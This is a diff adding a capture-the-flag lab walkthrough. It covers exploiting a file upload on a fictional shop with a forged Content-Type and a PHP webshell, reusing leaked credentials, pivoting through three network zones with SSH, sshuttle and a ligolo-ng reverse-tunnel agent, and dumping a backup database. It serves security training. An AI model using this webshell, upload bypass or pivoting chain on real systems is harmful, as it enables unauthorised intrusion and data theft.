@@ -1,0 +1,326 @@
+# STEP 1: Get connected
+
+Pick your entry point — both land you in the DMZ (10.100.100.0/24):
+
+  * Kali desktop (easiest): browser, Burp, nmap, ligolo — all
+    preinstalled. Open it from the Connect menu.
+  * Your own machine: WireGuard config from the Connect menu.
+
+Everything deeper than the DMZ needs a pivot — that is this lab.
+
+@action open-connect
+
+# STEP 2: Recon the DMZ
+
+WHERE: terminal on your Kali box
+
+  nmap -sn 10.100.100.0/24
+  nmap -sV 10.100.100.10
+
+One host answers: the Tang Wang Jeng storefront. Confirm the
+segmentation you are about to defeat:
+
+  nmap -sn 10.100.200.0/24          # nothing — as designed
+
+# STEP 3: Exploit the upload
+
+WHERE: browser on your Kali box
+
+Browse to http://10.100.100.10. Register an account, add a drink,
+check out. The order asks for a payment slip — that upload is the
+bug.
+
+The code makes two classic mistakes:
+
+  * it trusts the Content-Type header — but that header comes from
+    YOUR browser, so YOU control it;
+  * the extension blacklist (.exe .sh .bat .com .dll) forgot .php.
+
+A plain upload of shell.php fails — the browser honestly sends
+Content-Type: application/x-php. The lesson: lie about it.
+
+First prepare the payload. This lab teaches pivoting, not PHP, so
+here is a one-line webshell that runs any command passed as ?c=...:
+
+WHERE: terminal on your Kali box
+
+  printf '<?php system($_GET["c"]); ?>' > shell.php
+
+Now get it past the check — pick a tool:
+
+@choice burp | A. Burp Suite (built-in browser)
+WHERE: Burp on your Kali box
+
+1. Launch Burp (Kali menu, or: burpsuite &).
+2. Proxy tab > Intercept > Open Browser. Burp ships with its own
+   browser — already proxied, no setup needed.
+3. In that browser: log in to the shop, reach the payment page.
+4. Turn Intercept ON, then upload shell.php as the slip.
+5. Burp shows the request. Find the part that says:
+
+     Content-Type: application/x-php
+
+   Change it to:
+
+     Content-Type: image/png
+
+6. Press Forward. The upload succeeds.
+
+This is the classic intercepting-proxy move: any check based on
+client-supplied headers can be rewritten mid-flight.
+@choice curl | B. curl (scriptable)
+WHERE: terminal on your Kali box
+
+# -F uploads multipart; "type=image/png" forges the header:
+curl -b cookies.txt -c cookies.txt \
+     -d 'username=hacker&password=hacker' \
+     http://10.100.100.10/register.php
+curl -b cookies.txt -c cookies.txt \
+     -d 'username=hacker&password=hacker' \
+     http://10.100.100.10/login.php
+curl -b cookies.txt 'http://10.100.100.10/cart.php?add=1'
+curl -b cookies.txt -d 'checkout=1' \
+     http://10.100.100.10/checkout.php
+curl -b cookies.txt -F 'slip=@shell.php;type=image/png' \
+     'http://10.100.100.10/pay.php?order=1'
+# END
+
+# STEP 4: Use the web shell — FLAG 1
+
+WHERE: browser on your Kali box
+
+The shell is now live at /uploads/shell.php. Commands travel in
+the URL as ?c=... — try:
+
+  http://10.100.100.10/uploads/shell.php?c=id
+
+It answers uid=33(www-data) — that is code execution on the web
+server. Grab the flag:
+
+  http://10.100.100.10/uploads/shell.php?c=cat /home/flag1.txt
+
+(If a command needs spaces, encode them as %20 — or use the whole
+URL unencoded like above and most browsers fix it for you.)
+
+Lesson: validate file CONTENT (real image parsing), never
+client-supplied metadata.
+
+# STEP 5: Loot the machine
+
+WHERE: browser (webshell) — or curl, same thing
+
+  http://10.100.100.10/uploads/shell.php?c=printenv DB_PASS
+
+config.php even apologizes: IT reused the DB password for the local
+SSH account `webadmin`. One password, three systems — that is the
+real vulnerability of this lab. Remember this password, you will
+use it everywhere.
+
+Also look around the box: web has a second network interface
+(10.100.200.5) — the door to INTERNAL. You cannot route there
+directly; you must tunnel THROUGH web.
+
+# STEP 6: Pivot into INTERNAL
+
+web (10.100.100.10) is your only door into 10.100.200.0/24.
+Pick your tool by what you have ("root" = needs sudo):
+
+  tool                          your box    pivot box
+  ssh -D / -L / -J             no           no
+  sshuttle                     yes (tun)    no
+  ligolo-ng proxy              yes (tun)    no
+  ligolo-ng agent              —            no
+
+All passwords below are the DB_PASS from step 5.
+Your choice here is remembered — later steps adjust to it.
+
+@choice sshd | A. ssh -D + proxychains
+WHERE: terminal on your Kali box
+
+ssh -D 1080 webadmin@10.100.100.10        # leave it running
+
+Everything after this goes through the SOCKS proxy:
+
+  printf 'strict_chain\nproxy_dns\nsocks5 127.0.0.1 1080\n' > ~/pc.conf
+  proxychains -f ~/pc.conf nmap -sT -Pn 10.100.200.10 -p 22,80
+  proxychains -f ~/pc.conf curl http://10.100.200.10/login.php
+
+ssh -D opens a SOCKS proxy that EXITS from web's INTERNAL
+interface — anything SOCKS-aware now reaches the far network.
+No root needed anywhere.
+@choice sshL | B. ssh -L (forward one port)
+WHERE: terminal on your Kali box
+
+ssh -L 8080:10.100.200.10:80 webadmin@10.100.100.10
+
+Then browse http://127.0.0.1:8080 — it IS the far web page.
+Useful when you only need one service. No root needed.
+
+Multi-hop in one command (also no root):
+
+  ssh -J webadmin@10.100.100.10 posadmin@10.100.200.10
+@choice sshuttle | C. sshuttle (transparent VPN)
+WHERE: terminal on your Kali box
+
+sshuttle -r webadmin@10.100.100.10 10.100.200.0/24
+
+No proxychains, no per-app config — every app just works:
+
+  nmap -sT -Pn 10.100.200.0/24
+  curl http://10.100.200.10/login.php
+
+Root needed on YOUR box only (it creates a tun device).
+@choice ligolo | D. ligolo-ng (reverse tunnel)
+WHERE: two places — read carefully.
+
+1) Start the proxy. WHERE: terminal on your Kali box
+
+  sudo proxy -selfcert -laddr 0.0.0.0:11601
+
+It generates a certificate — the fingerprint is printed on first
+run (and re-readable with the openssl command below). Keep it: hex,
+NO colons.
+
+  openssl x509 -in /ligolo-selfcerts/ligolo_cert -noout \
+    -fingerprint -sha256 | cut -d= -f2 | tr -d :
+
+2) Send the agent. WHERE: the webshell (browser)
+
+The agent binary is already planted on the target. Make the
+webshell run it, connecting BACK to your proxy (10.100.100.50 =
+the Kali desktop; your own IP if on WireGuard):
+
+http://10.100.100.10/uploads/shell.php?c=/opt/tools/agent -connect 10.100.100.50:11601 -ignore-cert -accept-fingerprint YOURHEX &
+
+The agent runs as www-data — NO root on the target, and it
+connects outbound (no listening port on the victim).
+
+3) Drive it. WHERE: the proxy REPL (ligolo-ng » prompt)
+
+  session            -> lists agents; select yours (e.g. 1)
+  ifconfig           -> the AGENT's interfaces — spot 10.100.200.5,
+                        web's door to INTERNAL
+  start              -> tunnel starts; creates interface "ligolo"
+                        on YOUR box
+
+4) Route the far subnet. WHERE: a SECOND terminal on your Kali box
+
+  sudo ip route add 10.100.200.0/24 dev ligolo
+
+5) Use it. WHERE: any app on your Kali box — directly, no proxy
+
+  nmap -sT -Pn 10.100.200.0/24
+  curl http://10.100.200.10/login.php
+# END
+
+# STEP 7: The POS — FLAG 2
+
+WHERE: browser, through your tunnel from step 6
+@variant sshd
+First point Firefox at your SOCKS proxy: Settings > Network >
+Proxy > Manual > SOCKS5 host 127.0.0.1 port 1080. Then browse
+http://10.100.200.10 — no proxychains needed for the browser.
+@variant sshL
+If you forwarded port 8080 in step 6, the POS login page is
+already waiting at http://127.0.0.1:8080.
+@variant sshuttle
+Nothing extra to do — just browse http://10.100.200.10.
+@variant ligolo
+Nothing extra to do — the route from step 6 covers it. Just
+browse http://10.100.200.10.
+# END
+
+Log in as `staff` — the DB password again. Check the Orders
+screen: the drink you ordered in step 3 is there. Same database,
+two networks — that is why the customer site leaked internal data.
+
+Now SSH in (third reuse of the password, user posadmin):
+
+WHERE: terminal on your Kali box
+
+  ssh -J webadmin@10.100.100.10 posadmin@10.100.200.10
+  cat /home/posadmin/flag2.txt
+
+(If you are on ligolo or sshuttle you can also ssh directly:
+ssh posadmin@10.100.200.10 — the tunnel already reaches it.)
+
+Then read the IT Handbook on the POS web app: a DRAFT note leaks
+TEMPORARY credentials for the HQ backup server (user `backup`,
+a different password this time). That is your ticket to zone 3.
+
+# STEP 8: Pivot into RESTRICTED
+
+Same lesson, deeper: the POS (10.100.200.10) is the only machine
+that can reach 10.100.250.0/24. Pick your way through posadmin —
+this choice is also remembered for the final step.
+
+@choice sshJ2 | A. ssh -J multi-hop
+WHERE: terminal on your Kali box
+
+ssh -J webadmin@10.100.100.10,posadmin@10.100.200.10 \
+    backup@10.100.250.10
+
+Each jump host asks for its own password. No root needed.
+@choice sshuttle2 | B. sshuttle chain
+WHERE: terminal on your Kali box — two tunnels
+
+sshuttle -r webadmin@10.100.100.10 10.100.200.0/24
+sshuttle -r posadmin@10.100.200.10 10.100.250.0/24
+@choice ligolo2 | C. ligolo-ng again
+WHERE: same dance as step 6
+
+The agent binary is planted on the POS too. SSH there through
+your first tunnel and run it:
+
+  ssh posadmin@10.100.200.10
+  /opt/tools/agent -connect <YOUR-IP>:11601 \
+    -ignore-cert -accept-fingerprint <HEX> &
+
+Then in the proxy REPL: session (pick the new agent), start —
+it creates another interface. Route the new subnet in your other
+terminal:
+
+  sudo ip route add 10.100.250.0/24 dev ligolo
+
+The proxy supports several agents at once — session switches
+between them. That is how real engagements chain pivots.
+# END
+
+# STEP 9: HQ backup — FLAG 3 + recap
+
+WHERE: terminal on your Kali box (through both pivots)
+@variant sshJ2
+Your multi-hop ssh -J command from step 8 already lands you on
+the backup server — you are done connecting.
+@variant sshuttle2
+Both routes are up; just ssh backup@10.100.250.10 directly.
+@variant ligolo2
+The route from step 8 covers it: ssh backup@10.100.250.10.
+@variant sshd
+Through the proxy: proxychains -f ~/pc.conf ssh backup@10.100.250.10
+(SSH must also go through SOCKS to reach the restricted zone —
+one proxychain, all the way down.)
+@variant sshL
+Chain one more forward through posadmin first:
+  ssh -L 25010:10.100.250.10:22 posadmin@10.100.200.10
+  ssh -p 25010 backup@127.0.0.1
+# END
+
+  ssh backup@10.100.250.10            # password from the IT handbook
+  cat /home/backup/flag3.txt          # FLAG 3
+  cat /home/backup/sales_backup_2026.sql
+
+The SQL dump is the "breach": franchise sales + member data.
+Root login is disabled there and only `backup` is allowed — the
+pivot was the only way in. That is the point.
+
+What you practiced:
+
+  1. client-trusted validation (Content-Type) + incomplete blacklist
+  2. credential reuse turning one leak into network-wide access
+  3. SOCKS forwarding (ssh -D + proxychains)          no root
+  4. port forwarding (ssh -L) and jumps (ssh -J)      no root
+  5. transparent routing (sshuttle)                   root, yours
+  6. reverse tunneling (ligolo-ng, agent rootless)
+
+Submit all three flags (Play > Submit flags) to finish.
